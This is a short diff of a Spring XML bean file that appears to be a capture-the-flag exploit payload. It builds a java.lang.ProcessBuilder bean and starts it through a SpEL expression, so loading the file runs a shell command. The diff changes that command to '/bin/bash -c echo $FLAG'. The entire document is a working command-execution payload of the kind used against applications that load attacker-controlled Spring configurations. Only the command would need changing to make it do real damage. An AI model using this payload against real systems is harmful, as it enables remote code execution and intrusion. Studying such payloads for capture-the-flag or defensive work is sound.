@@ -5,8 +5,9 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="echo" />
-     <constructor-arg value="$FLAG" />
+     <constructor-arg value="/bin/bash" />
+     <constructor-arg value="-c" />
+     <constructor-arg value="echo $FLAG" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
